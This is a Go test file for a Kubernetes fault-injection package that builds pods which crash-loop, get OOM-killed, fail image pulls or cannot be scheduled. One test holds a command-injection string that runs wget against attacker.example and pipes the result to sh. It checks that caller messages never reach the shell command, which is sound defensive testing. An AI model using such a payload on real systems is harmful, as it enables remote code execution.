// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package kubestate

import (
	"strconv"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
)

func build(t *testing.T, kind string, spec map[string]any) corev1.PodSpec {
	t.Helper()
	ps, err := builders[kind](spec)
	if err != nil {
		t.Fatalf("build %s: %v", kind, err)
	}
	return ps
}

func buildErr(t *testing.T, kind string, spec map[string]any) error {
	t.Helper()
	if _, err := builders[kind](spec); err != nil {
		return err
	}
	t.Fatalf("build %s with spec %v succeeded, want error", kind, spec)
	return nil
}

func TestImageUnresolvablePod(t *testing.T) {
	ps := build(t, KindImageUnresolvable, nil)
	c := ps.Containers[0]
	if c.Image != defaultBadImage {
		t.Errorf("image = %q, want %q", c.Image, defaultBadImage)
	}
	// PullIfNotPresent would let a warm image cache on one node silently heal
	// the fault, so the same manifest would land or not depending on where the
	// scheduler put the pod.
	if c.ImagePullPolicy != corev1.PullAlways {
		t.Errorf("pull policy = %q, want %q", c.ImagePullPolicy, corev1.PullAlways)
	}
	if got := build(t, KindImageUnresolvable, map[string]any{"image": "example.invalid/x:1"}).Containers[0].Image; got != "example.invalid/x:1" {
		t.Errorf("spec.image ignored: got %q", got)
	}
}

func TestContainerExitLoopPod(t *testing.T) {
	ps := build(t, KindContainerExitLoop, nil)
	c := ps.Containers[0]
	if c.Image != defaultRunnerImage {
		t.Errorf("image = %q, want %q", c.Image, defaultRunnerImage)
	}
	cmd := strings.Join(c.Command, " ")
	if !strings.Contains(cmd, "exit 1") {
		t.Errorf("command %q does not exit non-zero", cmd)
	}
	var msg string
	for _, e := range c.Env {
		if e.Name == exitMessageEnv {
			msg = e.Value
		}
	}
	if msg != defaultExitMessage {
		t.Errorf("%s = %q, want %q", exitMessageEnv, msg, defaultExitMessage)
	}
}

func TestContainerExitLoopCustomCode(t *testing.T) {
	cmd := strings.Join(build(t, KindContainerExitLoop, map[string]any{"exit_code": float64(137)}).Containers[0].Command, " ")
	if !strings.Contains(cmd, "exit 137") {
		t.Errorf("command %q does not carry the requested exit code", cmd)
	}
}

// The message is caller-supplied text that ends up next to a shell. It has to
// travel as an environment variable; interpolating it into the command string
// is how a scenario pack that wants a specific log line becomes arbitrary
// command execution inside the arena.
func TestContainerExitLoopMessageNeverReachesTheCommand(t *testing.T) {
	evil := `x"; wget http://attacker.example/p | sh; echo "`
	c := build(t, KindContainerExitLoop, map[string]any{"message": evil}).Containers[0]
	cmd := strings.Join(c.Command, " ")
	if strings.Contains(cmd, "wget") || strings.Contains(cmd, evil) {
		t.Fatalf("caller message was interpolated into the command: %q", cmd)
	}
	if c.Env[0].Value != evil {
		t.Errorf("message did not survive as an env value: %q", c.Env[0].Value)
	}
}

func TestContainerExitLoopRejects(t *testing.T) {
	// exit 0 still crash-loops, but the pod reports lastState reason
	// Completed, which poses a different diagnosis than this kind exists for.
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(0)}); !strings.Contains(err.Error(), "non-zero") {
		t.Errorf("exit_code 0: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(256)}); !strings.Contains(err.Error(), "between 1 and 255") {
		t.Errorf("exit_code 256: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": float64(-1)}); err == nil {
		t.Error("negative exit code accepted")
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": "one"}); !strings.Contains(err.Error(), "must be a number") {
		t.Errorf("non-numeric exit_code: %v", err)
	}
	if err := buildErr(t, KindContainerExitLoop, map[string]any{"exit_code": 1.5}); !strings.Contains(err.Error(), "whole number") {
		t.Errorf("fractional exit_code: %v", err)
	}
}

func TestMemoryLimitSqueezePod(t *testing.T) {
	ps := build(t, KindMemoryLimitSqueeze, nil)
	c := ps.Containers[0]
	want := resource.MustParse(defaultMemoryLimit)
	if got := c.Resources.Limits[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("memory limit = %s, want %s", got.String(), want.String())
	}
	// requests == limits, or the pod becomes an eviction candidate under node
	// pressure and the fault sometimes reads as a node problem instead.
	if got := c.Resources.Requests[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("memory request = %s, want %s", got.String(), want.String())
	}
	// The allocation must be anonymous memory, freed when the process dies. A
	// memory-backed emptyDir belongs to the pod: its pages outlive the
	// container, and the restarted container's runc init is OOM-killed before
	// any of our code runs, so the pod reports StartError and the OOM kill the
	// fault is about is overwritten within seconds. Measured on GKE.
	if len(ps.Volumes) != 0 {
		t.Errorf("pod carries volumes %+v; tmpfs pages survive the restart and turn OOMKilled into StartError", ps.Volumes)
	}
	if len(c.VolumeMounts) != 0 {
		t.Errorf("container mounts %+v, want none", c.VolumeMounts)
	}
	cmd := strings.Join(c.Command, " ")
	if want := strconv.Itoa(defaultMemoryAllocateMB * 1024 * 1024); !strings.Contains(cmd, want) {
		t.Errorf("command %q does not allocate %dMi (%s bytes)", cmd, defaultMemoryAllocateMB, want)
	}
	// If the allocation somehow stays inside the limit the container must
	// idle, not exit: a container that exits crash-loops, and a crash loop is
	// the diagnosis ContainerExitLoop poses.
	if !strings.Contains(cmd, "; sleep") {
		t.Errorf("command %q exits instead of idling when the allocation does not trip the limit", cmd)
	}
}

func TestMemoryLimitSqueezeRejects(t *testing.T) {
	// A container that stays inside its cgroup is never OOMKilled: the fault
	// would apply cleanly and do nothing, which is the failure mode the whole
	// efficacy story exists to prevent.
	err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "256Mi", "allocate_mb": float64(64)})
	if !strings.Contains(err.Error(), "must exceed") {
		t.Errorf("allocation inside the limit: %v", err)
	}
	// Exactly at the limit is not over it.
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "64Mi", "allocate_mb": float64(64)}); err == nil {
		t.Error("allocate_mb exactly equal to the limit was accepted")
	}
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "not-a-quantity"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad quantity: %v", err)
	}
	if err := buildErr(t, KindMemoryLimitSqueeze, map[string]any{"allocate_mb": float64(0)}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero allocation: %v", err)
	}
}

func TestMemoryLimitSqueezeCustomSizes(t *testing.T) {
	ps := build(t, KindMemoryLimitSqueeze, map[string]any{"limit_memory": "16Mi", "allocate_mb": float64(48)})
	c := ps.Containers[0]
	want := resource.MustParse("16Mi")
	if got := c.Resources.Limits[corev1.ResourceMemory]; got.Cmp(want) != 0 {
		t.Errorf("limit = %s, want 16Mi", got.String())
	}
	if !strings.Contains(strings.Join(c.Command, " "), strconv.Itoa(48*1024*1024)) {
		t.Errorf("command does not allocate 48Mi: %v", c.Command)
	}
}

func TestUnschedulablePodByCPU(t *testing.T) {
	ps := build(t, KindUnschedulable, nil)
	got := ps.Containers[0].Resources.Requests[corev1.ResourceCPU]
	want := resource.MustParse(defaultUnschedulableCPU)
	if got.Cmp(want) != 0 {
		t.Errorf("cpu request = %s, want %s", got.String(), want.String())
	}
	// A merely-large request is a provisioning signal: a cluster autoscaler or
	// GKE Node Auto-Provisioning would add a node, the pod would schedule, and
	// the fault would heal partway through the experiment with a machine on
	// the bill. The default has to be beyond any shape a cloud sells.
	if got.Cmp(resource.MustParse("512")) < 0 {
		t.Errorf("default cpu request %s is small enough for an autoscaler to satisfy", got.String())
	}
	if ps.NodeSelector != nil {
		t.Errorf("unexpected node selector %v", ps.NodeSelector)
	}
}

func TestUnschedulablePodByNodeSelector(t *testing.T) {
	ps := build(t, KindUnschedulable, map[string]any{
		"node_selector": map[string]any{"failure-domain.example.com/zone": "nowhere"},
	})
	if ps.NodeSelector["failure-domain.example.com/zone"] != "nowhere" {
		t.Errorf("node selector = %v", ps.NodeSelector)
	}
	// Mutually exclusive with the CPU request: with both set, the
	// FailedScheduling message would name whichever predicate the scheduler
	// happened to evaluate first, and the evidence the agent reads would be
	// non-deterministic.
	if len(ps.Containers[0].Resources.Requests) != 0 {
		t.Errorf("node_selector did not suppress the cpu request: %v", ps.Containers[0].Resources.Requests)
	}
}

func TestUnschedulableNodeSelectorWinsOverRequestCPU(t *testing.T) {
	ps := build(t, KindUnschedulable, map[string]any{
		"request_cpu":   "999",
		"node_selector": map[string]any{"k": "v"},
	})
	if len(ps.Containers[0].Resources.Requests) != 0 {
		t.Errorf("both mechanisms applied: %v", ps.Containers[0].Resources.Requests)
	}
}

func TestUnschedulableRejects(t *testing.T) {
	if err := buildErr(t, KindUnschedulable, map[string]any{"request_cpu": "lots"}); !strings.Contains(err.Error(), "not a quantity") {
		t.Errorf("bad cpu quantity: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"request_cpu": "0"}); !strings.Contains(err.Error(), "positive") {
		t.Errorf("zero cpu: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"node_selector": "zone=nowhere"}); !strings.Contains(err.Error(), "must be an object") {
		t.Errorf("scalar node_selector: %v", err)
	}
	if err := buildErr(t, KindUnschedulable, map[string]any{"node_selector": map[string]any{"k": float64(1)}}); !strings.Contains(err.Error(), "must be a string") {
		t.Errorf("non-string node_selector value: %v", err)
	}
}

func TestOptHelpers(t *testing.T) {
	if got := optString(nil, "x", "def"); got != "def" {
		t.Errorf("optString(nil) = %q", got)
	}
	// An empty string is the same as unset: a planner that emits "name": ""
	// must not produce a workload named "-<suffix>".
	if got := optString(map[string]any{"x": ""}, "x", "def"); got != "def" {
		t.Errorf("optString(empty) = %q, want the default", got)
	}
	if got := optString(map[string]any{"x": float64(3)}, "x", "def"); got != "def" {
		t.Errorf("optString(non-string) = %q, want the default", got)
	}
	for _, v := range []any{int(7), int64(7), float64(7)} {
		n, err := optInt(map[string]any{"x": v}, "x", 0)
		if err != nil || n != 7 {
			t.Errorf("optInt(%T) = %d, %v", v, n, err)
		}
	}
	if n, err := optInt(map[string]any{"y": 1}, "x", 5); err != nil || n != 5 {
		t.Errorf("optInt(missing) = %d, %v", n, err)
	}
	if m, err := optStringMap(nil, "x"); err != nil || m != nil {
		t.Errorf("optStringMap(nil) = %v, %v", m, err)
	}
}
